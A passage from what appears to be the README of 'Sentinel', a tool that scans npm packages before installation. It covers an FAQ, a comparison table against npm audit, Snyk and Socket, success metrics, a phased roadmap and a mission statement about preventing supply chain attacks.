A: No. Choose one per deployment. Use SQLite locally, Supabase in production.

**Q: How do I migrate from SQLite to Supabase?**
A: Export SQLite → Import to Supabase (script included in repo).

**Q: Does Sentinel send my code to Google?**
A: No. Only package names, versions, and npm metadata go to Gemini.

**Q: What if I don't want to use Gemini?**
A: You can disable the AI check (verdict will be based on 3 checks only).

**Q: Can I use my own database?**
A: Yes, contributing database adapters is encouraged!

**Q: How does Sentinel compare to other tools?**

| Tool | When Scans | What Checks | Blocks Install |
|------|-----------|------------|---|
| npm audit | After install | Known CVEs only | ❌ No |
| Snyk | On command | Known vulnerabilities | ⚠️ Optional |
| Socket | On demand | Single package | ❌ No |
| **Sentinel** | **Before install** | **All 4 checks + AI** | **✅ Yes** |

---

## Success Metrics

### For Teams
- PRs blocked by Sentinel (high-risk packages prevented)
- Scan latency (target: <5 seconds)
- GitHub Action adoption rate

### For Solo Devs
- CLI downloads/week
- Packages caught before installation
- Dashboard free accounts created
- Community feedback on UX

---

## Roadmap & Next Steps

### Phase 1 (Current)

We're building:

#### ✅ **For Teams**
- GitHub Action (one YAML file setup)
- Backend API for scanning
- Dashboard to view all scans
- Auto-blocking on BLOCK verdict

#### ✅ **For Solo Devs**
- CLI tool: `npx sentinel check-all`
- Scans multiple package managers
- Terminal verdict + next steps
- Optional dashboard for history

### Phase 2

- VS Code extension
- npm hook
- Git hook
- Pre-commit integration

### Phase 3

- Slack/Discord integration
- SBOM export
- Custom policy engine
- Organization management

### Future Roadmap

- **v1.1**: Slack/Discord integration
- **v1.2**: Private npm registry support
- **v2.0**: Custom checks API, organization policies
- **v3.0**: Threat intelligence feeds, SBOM export

---

## Why Now?

1. **Urgency**: Supply chain attacks are accelerating (16+ per month in 2025)
2. **Market**: Every team and solo dev needs this
3. **Tech ready**: Gemini API + npm registry data available
4. **Timing**: Post-SolarWinds/Shai-Hulud, security-conscious devs are ready

---

## Our Mission

**Sentinel exists to make the JavaScript ecosystem safe by default.**

No more hoping packages are safe.  
No more learning about compromises weeks after installation.  
No more supply chain attacks that could have been prevented.

Check before you install. Stay secure. Sleep better. 🛡️

---

**Built with ❤️ for JavaScript security.**